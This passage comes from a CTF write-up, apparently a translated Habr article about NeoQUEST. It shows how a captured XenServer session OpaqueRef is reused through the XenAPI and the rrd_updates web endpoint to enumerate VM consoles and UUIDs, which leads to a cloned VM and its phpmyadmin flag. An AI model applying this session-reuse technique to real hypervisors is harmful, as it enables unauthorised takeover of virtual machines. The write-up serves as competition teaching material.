class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: []}</code> </pre><br></div></div><br><br>  The result is again big enough, but most of the values ‚Äã‚Äãare empty, and, like last time, these are not the consoles themselves, but links for them.  There are also virtual machines where there are two links for the console.  The console.get_location function is used to convert the link into a value suitable for an applet.  Then the script has the form: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> XenAPI xen_url = <span class="hljs-string"><span class="hljs-string">"https://10.0.20.61"</span></span> ses = <span class="hljs-string"><span class="hljs-string">"OpaqueRef:427a76b3-2d50-89bb-28e6-eb9e51c66971"</span></span> session = XenAPI.Session(xen_url) vms = session.VM.get_all(ses) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> vm in vms[<span class="hljs-string"><span class="hljs-string">'Value'</span></span>]: console = session.VM.get_consoles(ses,vm) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> con in console[<span class="hljs-string"><span class="hljs-string">'Value'</span></span>]: url = session.console.get_location(ses,con) print url</code> </pre><br><br>  The result of the script will be: <br><br><pre> <code class="cpp hljs">{<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: <span class="hljs-string"><span class="hljs-string">'https://10.0.20.61/console?uuid=9b7965ed-002b-5d52-4bd6-380556aa2219'</span></span>} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: <span class="hljs-string"><span class="hljs-string">'https://10.0.20.61/console?uuid=1a9df134-6e10-22a5-6f99-2d1df8f2fc58'</span></span>} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: <span class="hljs-string"><span class="hljs-string">'https://10.0.20.61/console?uuid=68d03d5d-d9cd-0b91-c61f-213f3a572582'</span></span>} {<span class="hljs-string"><span class="hljs-string">'Status'</span></span>: <span class="hljs-string"><span class="hljs-string">'Success'</span></span>, <span class="hljs-string"><span class="hljs-string">'Value'</span></span>: <span class="hljs-string"><span class="hljs-string">'https://10.0.20.61/console?uuid=b1c1a188-26bf-e5c8-a5ed-7545f17f492b'</span></span>}</code> </pre><br><br>  The last value is the same as in the URL field, which suggests that we are on the right track!  It remains to check only 3 solutions. <br><br><h5>  <b>Method number 2: via the Web</b> </h5><br>  The second solution is much simpler and entirely web based.  If you google ‚ÄúXenserver OpaqueRef‚Äù, you can stumble upon a description of how to get performance metrics for Xenserver via RRD.  To get some of these metrics, you only need to know the server‚Äôs IP address and OpaqueRef.  So, to get all the metrics of a virtual machine, you need to know the UUID of the virtual machine "http: /// vm_rrd? Session_id = OpaqueRef: &amp; uuid =", but to get updates for all virtual machines, all you need to know is OpaqueRef.  We receive it by the request ‚Äúhttp: /// rrd_updates? Session_id = OpaqueRef: &amp; start = 10258122541‚Äù.  In our case, the request will look like: "http://10.0.20.61/rrd_updates?session_id=OpaqueRef:427a76b3-2d50-89bb-28e6-eb9e51c66971&amp;start=10258122541". <div class="spoiler">  <b class="spoiler_title">As a result, the following xml will be displayed in the browser:</b> <div class="spoiler_text"><pre> <code class="cpp hljs">&lt;xport&gt; &lt;meta&gt; &lt;start&gt;<span class="hljs-number"><span class="hljs-number">10258122545</span></span>&lt;/start&gt; &lt;step&gt;<span class="hljs-number"><span class="hljs-number">5</span></span>&lt;/step&gt; &lt;end&gt;<span class="hljs-number"><span class="hljs-number">1436505840</span></span>&lt;/end&gt; &lt;rows&gt;<span class="hljs-number"><span class="hljs-number">0</span></span>&lt;/rows&gt; &lt;columns&gt;<span class="hljs-number"><span class="hljs-number">26</span></span>&lt;/columns&gt; &lt;legend&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">4</span></span>ac6b5b5-fb19<span class="hljs-number"><span class="hljs-number">-4874</span></span>-b87a-c0da37f807cf:cpu3 &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">4</span></span>ac6b5b5-fb19<span class="hljs-number"><span class="hljs-number">-4874</span></span>-b87a-c0da37f807cf:cpu2 &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">4</span></span>ac6b5b5-fb19<span class="hljs-number"><span class="hljs-number">-4874</span></span>-b87a-c0da37f807cf:cpu1 &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">4</span></span>ac6b5b5-fb19<span class="hljs-number"><span class="hljs-number">-4874</span></span>-b87a-c0da37f807cf:cpu0 &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">4</span></span>ac6b5b5-fb19<span class="hljs-number"><span class="hljs-number">-4874</span></span>-b87a-c0da37f807cf:memory &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">4</span></span>ac6b5b5-fb19<span class="hljs-number"><span class="hljs-number">-4874</span></span>-b87a-c0da37f807cf:memory_target &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:cpu0 &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:memory &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:vbd_hdd_write &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:vbd_hdd_read &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:vbd_hda_write &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:vbd_hda_read &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:memory_target &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:vif_0_tx &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:vif_0_rx &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">11</span></span>c607ae-c779-c9dd<span class="hljs-number"><span class="hljs-number">-6b</span></span>5e<span class="hljs-number"><span class="hljs-number">-17f</span></span>d4461defe:memory_internal_free &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:cpu0 &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:vif_0_tx &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:vif_0_rx &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:vbd_hdd_write &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:vbd_hdd_read &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:vbd_hda_write &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:vbd_hda_read &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:memory &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:memory_internal_free &lt;/entry&gt; &lt;entry&gt; AVERAGE:vm:<span class="hljs-number"><span class="hljs-number">362f</span></span>5638-b9af<span class="hljs-number"><span class="hljs-number">-56e8</span></span><span class="hljs-number"><span class="hljs-number">-52</span></span>dd<span class="hljs-number"><span class="hljs-number">-92f</span></span>79267f6ef:memory_target &lt;/entry&gt; &lt;/legend&gt; &lt;/meta&gt; &lt;data/&gt; &lt;/xport&gt;</code> </pre><br></div></div><br><br>  From this xml you can get 3 UUIDs: 4ac6b5b5-fb19-4874-b87a-c0da37f807cf, 11c607ae-c779-c9dd-6b5e-17fd4461defe, 362f5638-b9af-56e8-52dd-92f79267f6ef. <br>  Although the UUIDs do not coincide with those in the assignment, they are also suitable! <br><br><h5>  <b>End of task</b> </h5><br>  Next, we loop through the available UUIDs or links to the local copy of the site with the applet.  In the case of a link obtained through the API, the correct result will be <a href="https://10.0.20.61/console%3Fuuid%3D9b7965ed-002b-5d52-4bd6-380556aa2219">10.0.20.61/console?uuid=9b7965ed-002b-5d52-4bd6-380556aa2219</a> , and in the case of the UUID, 11c607ae-c779-c9dd-6b5e-17fd4461defe.  We get to the clone of the first virtual machine, but the history is cleared in the browser.  However, we remember that phpmyadmin was there!  We go to localhost / phpmyadmin, there is the same base - neoquest, with the same table - key, in which lies the key: <br><br><img src="https://habrastorage.org/files/57e/004/b15/57e004b151174f48bfbaf20d84909c4e.png"><br><br>  Thus, using this applet, an attacker can ‚Äúhijack‚Äù your XenServer cloud! <br><br><h5>  <b>And registration on NeoQUEST-2016 continues!</b> </h5><br>  At NeoQUEST-2016, participants will find a lot of interesting and diverse tasks, both complex and fairly simple, which even the newcomers to information security can pass.  Choose your side and <a href="http://2016.neoquest.ru/">register</a> ! </div><p>Source: <a href="https://habr.com/ru/post/264555/">https://habr.com/ru/post/264555/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../264545/index.html">Deploying Rancher to InfoboxCloud: a portable infrastructure with a web interface for Docker</a></li>
<li><a href="../264547/index.html">Comparison of HP ProLiant DL360 Gen6 and HP ProLiant DL360 Gen8. What do we pay more for?</a></li>
<li><a href="../264549/index.html">How Spotify Scales Apache Storm</a></li>
<li><a href="../264551/index.html">Past and Present SSL Certificates</a></li>
<li><a href="../264553/index.html">SMR: understandable in theory, difficult to practice</a></li>
<li><a href="../264557/index.html">Webinar "Meet the FlyElephant"</a></li>
<li><a href="../264559/index.html">The benefits of learning the languages ‚Äã‚Äãof the family C</a></li>
<li><a href="../264561/index.html">An example of working with iBeacon technology using Swift</a></li>
<li><a href="../264565/index.html">Crowdsourcing map service for works of art</a></li>
<li><a href="../264567/index.html">Cthulhi in the bank: how we solved ICFPC 2015</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>